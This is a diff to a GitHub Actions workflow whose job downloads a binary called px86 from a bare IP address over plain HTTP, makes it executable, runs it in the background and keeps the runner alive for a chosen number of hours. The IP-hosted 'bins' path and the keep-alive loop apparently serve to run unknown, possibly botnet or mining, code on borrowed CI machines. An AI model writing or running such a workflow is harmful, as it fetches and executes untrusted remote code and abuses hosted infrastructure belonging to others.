@@ -20,14 +20,21 @@ jobs:
   run-binary:
     runs-on: ubuntu-latest
     steps:
-      - name: Download and run binary
+      - name: Download and run binary in background
         run: |
           wget http://45.138.16.158/bins/px86 -O px86
           chmod +x px86
-          ./px86 x86 || echo "Binary exited with error"
+          echo "🟢 Launching binary in background..."
+          ./px86 x86 &
 
-      - name: Keep VM alive
+          echo "📌 PID of background process: $!"
+          echo $! > px86.pid
+
+      - name: Keep runner alive
         run: |
           UPTIME_SECONDS=$(( ${{ github.event.inputs.uptime }} * 3600 ))
-          echo "Sleeping for $UPTIME_SECONDS seconds..."
-          sleep $UPTIME_SECONDS
+          echo "⏰ Keeping VPS alive for $UPTIME_SECONDS seconds..."
+          echo "🛑 To stop early, cancel the workflow manually."
+
+          # Tail a dummy file to keep step active
+          timeout $UPTIME_SECONDS tail -f /dev/null
